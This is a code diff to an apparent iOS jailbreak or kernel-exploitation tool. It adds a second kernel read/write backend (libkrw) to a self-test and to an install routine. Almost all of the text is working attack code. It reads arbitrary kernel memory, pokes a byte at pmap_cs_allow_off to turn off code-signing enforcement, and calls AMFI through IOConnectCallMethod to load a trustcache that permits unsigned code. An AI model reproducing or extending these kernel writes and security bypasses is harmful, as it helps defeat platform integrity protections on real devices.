@@ -3,6 +3,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 #import "Lum1naSocketKRW.h"
+#import "Lum1naLibkrw.h"
 #import "P06xLog.h"
 
 #import <IOKit/IOKitLib.h>
@@ -413,32 +414,38 @@ static int ak_spawn(NSString *path, NSArray<NSString *> *args, NSMutableString *
 static BOOL ak_krwSelfTest(NSMutableString *s) {
     Lum1naBoard *b = [Lum1naBoard shared];
     Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
-    if (!b.hasKread || !ctx) {
-        ak_log(s, @"[-] KRW test SKIP — hasKread=%@ ctx=%p",
-               b.hasKread ? @"YES" : @"NO", ctx);
+    /* B1 harness path: on the rig the board committed via libkrw (no SocketKRW ctx). */
+    if (!b.hasKread || (!ctx && !Lum1naLibkrw_IsLive())) {
+        ak_log(s, @"[-] KRW test SKIP — hasKread=%@ ctx=%p libkrw=%@",
+               b.hasKread ? @"YES" : @"NO", ctx,
+               Lum1naLibkrw_IsLive() ? @"live" : @"dead");
         ak_printKRWSteps(s);
         return NO;
     }
-    uint64_t kbase = b.kbase ? b.kbase : ctx->kbase;
+    uint64_t kbase = b.kbase ? b.kbase : (ctx ? ctx->kbase : Lum1naLibkrw_Kbase());
     if (!kbase) {
         ak_log(s, @"[-] KRW test SKIP — kbase=0");
         return NO;
     }
-    uint32_t magic = Lum1naSocketKRW_KRead32(ctx, kbase);
+    uint32_t magic = ctx ? Lum1naSocketKRW_KRead32(ctx, kbase)
+                         : Lum1naLibkrw_KRead32(kbase);
     ak_log(s, @"[*] KRW test kread32(kbase=0x%llx)=0x%08x (want MH_MAGIC_64 0xfeedfacf)",
            (unsigned long long)kbase, magic);
     if (magic != MH_MAGIC_64) {
         ak_log(s, @"[-] KRW test FAIL — kbase is not a Mach-O. hasKread is a lie; refuse inject.");
         return NO;
     }
-    uint64_t vptr = Lum1naSocketKRW_KRead64(ctx, kbase + 0x1c);
+    uint64_t vptr = ctx ? Lum1naSocketKRW_KRead64(ctx, kbase + 0x1c)
+                        : Lum1naLibkrw_KRead64(kbase + 0x1c);
     ak_log(s, @"[*] KRW test kread64(kbase+0x1c)=0x%llx", (unsigned long long)vptr);
     if (vptr < 0xFFFFFF8000000000ULL) {
         ak_log(s, @"[-] KRW test FAIL — kbase+0x1c is not a kernel VA");
         return NO;
     }
     uint8_t buf[16] = {0};
-    if (Lum1naSocketKRW_KReadBuf(ctx, vptr, buf, sizeof(buf))) {
+    BOOL haveVersion = ctx ? Lum1naSocketKRW_KReadBuf(ctx, vptr, buf, sizeof(buf))
+                           : Lum1naLibkrw_KReadBuf(vptr, buf, sizeof(buf));
+    if (haveVersion) {
         ak_log(s, @"[*] KRW test version bytes %02x %02x %02x %02x %02x %02x %02x %02x",
                buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]);
     }
@@ -663,6 +670,8 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
 
     uint32_t selCopy = off->amfi_sel_copy;
     uint32_t selManifest = off->amfi_sel_manifest;
+    BOOL selsProven = (selCopy != 0 && selManifest != 0);
+    BOOL pmapOffProven = (off->pmap_cs_allow_off != 0);
     uint32_t pmapOff = off->pmap_cs_allow_off ? off->pmap_cs_allow_off : LabPmapCsAllowOff();
 
     uint64_t pmapVA = 0;
@@ -672,17 +681,29 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
         pmapVA = strtoull([[e[@"va"] description] UTF8String], NULL, 16);
         if (pmapVA) break;
     }
-    if (pmapVA && b.krwContext) {
+    if (!pmapOffProven && pmapVA) {
+        ak_log(s, @"[*] pmap_cs poke SKIPPED — pmap_cs_allow_off unproven on this SKU "
+                   @"(A13_22G100 rig table is link-base-only; rig is already PPL-bypassed by Dopamine)");
+    } else if (pmapVA && (b.krwContext || Lum1naLibkrw_IsLive())) {
         uint64_t addr = pmapVA + pmapOff;
         ak_log(s, @"[*] pmap_cs poke *(0x%llx)=1 (pmap+0x%x)", (unsigned long long)addr, pmapOff);
-        bool ok = Lum1naSocketKRW_KWrite8((Lum1naSocketKRWContext *)b.krwContext, addr, 1);
-        ak_log(s, @"[%@] pmap_cs KWrite8", ok ? @"+" : @"-");
+        bool ok = b.krwContext
+            ? Lum1naSocketKRW_KWrite8((Lum1naSocketKRWContext *)b.krwContext, addr, 1)
+            : Lum1naLibkrw_KWrite8(addr, 1);
+        ak_log(s, @"[%@] pmap_cs KWrite8 (%@)", ok ? @"+" : @"-",
+               b.krwContext ? @"socketkrw" : @"libkrw");
     } else {
         ak_log(s, @"[*] pmap poke waits for a leaks[] row kind=pmap (pmap kva still unknown)");
     }
 
     NSData *tc = ak_loadTrustcacheBlob(s);
     conn = ak_openAMFI(s);
+    if (conn && !selsProven) {
+        ak_log(s, @"[*] AMFI loadTrustCache SKIPPED — selectors unproven on this SKU "
+                  @"(A13_22G100 rig table is link-base-only; rig is already AMFI-relaxed by Dopamine)");
+        IOServiceClose(conn);
+        conn = 0;
+    }
     if (conn && tc) {
         kern_return_t kr = IOConnectCallMethod(conn, selCopy,
                                                NULL, 0,
